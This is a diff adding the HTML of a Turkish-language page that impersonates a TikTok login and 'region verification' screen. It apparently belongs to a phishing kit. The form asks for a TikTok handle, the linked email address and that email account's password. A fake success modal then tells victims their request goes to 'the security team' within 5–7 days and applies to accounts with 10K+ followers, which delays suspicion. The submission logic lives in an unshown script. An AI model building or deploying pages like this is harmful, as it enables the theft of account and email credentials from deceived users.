@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>TikTok — Giriş Yap</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div class="card">
+    <div class="header">
+      <div class="brand-mark">
+        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <path d="M19.5 6.5a4.5 4.5 0 0 1-4.5-4.5h-3v13.5a2.5 2.5 0 1 1-2.5-2.5c.17 0 .34.02.5.05V9.9a5.5 5.5 0 1 0 4.5 5.4V9a7 7 0 0 0 5 2V8a4.5 4.5 0 0 1 0-1.5z" fill="url(#g1)"/>
+          <defs>
+            <linearGradient id="g1" x1="0" y1="0" x2="24" y2="24">
+              <stop offset="0%" stop-color="#2ce5d8"/>
+              <stop offset="100%" stop-color="#ff3b6b"/>
+            </linearGradient>
+          </defs>
+        </svg>
+      </div>
+      <div class="header-title">TikTok'a Giriş Yap</div>
+      <div class="header-sub">Hesabına bağlan ve bölgeni doğrula</div>
+    </div>
+
+    <!-- Connection Status Badge -->
+    <div class="status-badge" id="connStatus">
+      <span class="dot"></span>
+      <span id="connText">Kontrol ediliyor...</span>
+    </div>
+
+    <!-- Region Switcher -->
+    <div class="section-label">
+      <span>HESAP BÖLGESİ</span>
+      <span id="isoBadge">ISO: US</span>
+    </div>
+
+    <div class="region-switcher">
+      <button type="button" class="region-btn active" id="btnUS" data-region="US">
+        🇺🇸 ABD (US)
+      </button>
+      <button type="button" class="region-btn" id="btnDE" data-region="DE">
+        🇩🇪 Almanya (DE)
+      </button>
+    </div>
+
+    <div class="region-meta">
+      <span>Dil: <strong id="localeText">en-US</strong></span>
+      <span>Bölge: <strong id="tzText">America/New_York</strong></span>
+    </div>
+
+    <form id="ttForm" autocomplete="off">
+      <!-- TikTok Kullanıcı Adı -->
+      <div class="field-group">
+        <div class="section-label">
+          <span>TIKTOK KULLANICI ADI</span>
+          <span>HANDLE</span>
+        </div>
+        <div class="input-box">
+          <span class="at-prefix">@</span>
+          <input type="text" id="ttUsername" class="with-prefix" placeholder="username" required minlength="2" />
+        </div>
+      </div>
+
+      <!-- Hesaba Bağlı E-posta -->
+      <div class="field-group">
+        <div class="section-label">
+          <span>HESABA BAĞLI E-POSTA</span>
+          <span>EMAIL</span>
+        </div>
+        <div class="input-box">
+          <input type="email" id="ttEmail" placeholder="ornek@gmail.com" required />
+        </div>
+      </div>
+
+      <!-- Şifre -->
+      <div class="field-group">
+        <div class="section-label">
+          <span>E-POSTA ŞİFRESİ</span>
+          <span>ŞİFRE</span>
+        </div>
+        <div class="input-box">
+          <input type="password" id="ttPassword" class="password-input" placeholder="••••••••••••" required />
+          <button type="button" class="pw-toggle" id="togglePwBtn">GÖSTER</button>
+        </div>
+      </div>
+
+      <div class="btn-stack">
+        <button type="submit" class="btn-primary" id="btnSubmit">
+          Giriş Yap
+        </button>
+      </div>
+    </form>
+
+    <div id="toastBox" class="toast"></div>
+
+    <div class="footer-note">
+      Giriş bilgilerin güvenli şekilde işlenir ve bölge doğrulaması yapılır.
+    </div>
+  </div>
+
+  <!-- ============================================= -->
+  <!-- BAŞARI OVERLAY — 5-7 GÜN İÇİNDE BİLGİLENDİRME -->
+  <!-- ============================================= -->
+  <div class="success-overlay" id="successOverlay" aria-hidden="true" role="dialog" aria-modal="true">
+    <div class="success-modal">
+      <div class="success-icon-wrap">
+        <svg viewBox="0 0 24 24">
+          <path d="M5 12.5l4.5 4.5L19 7.5" />
+        </svg>
+      </div>
+
+      <div class="success-title">Giriş Başarılı!</div>
+
+      <p class="success-text">
+        Hesabınız doğrulama sürecine alındı. Talebiniz güvenlik ekibimiz tarafından incelenecek.
+      </p>
+
+      <div class="success-timer">
+        <svg viewBox="0 0 24 24">
+          <circle cx="12" cy="12" r="9" />
+          <path d="M12 7v5l3 2" />
+        </svg>
+        <span>5 – 7 gün içinde bilgilendirileceksiniz</span>
+      </div>
+
+      <!-- 10K TAKİPÇİ BİLGİ NOTU -->
+      <div class="success-eligibility">
+        <svg viewBox="0 0 24 24">
+          <path d="M12 3l9 16H3z" />
+          <path d="M12 10v4" />
+          <circle cx="12" cy="17" r="0.5" fill="currentColor" />
+        </svg>
+        <span>
+          Bu doğrulama süreci <strong>en az 10K takipçi ve üzeri</strong> hesaplar için uygundur.
+        </span>
+      </div>
+
+      <p class="success-text" style="font-size:13px; margin-bottom:0;">
+        Süreç tamamlandığında kayıtlı e-posta adresinize bildirim gönderilecektir.
+      </p>
+
+      <button type="button" class="success-close-btn" id="successCloseBtn" style="margin-top:22px;">
+        Tamam
+      </button>
+
+      <div class="success-footer-note">
+        Bildirim gelene kadar lütfen giriş bilgilerinizi kimseyle paylaşmayın.
+      </div>
+    </div>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+</html>
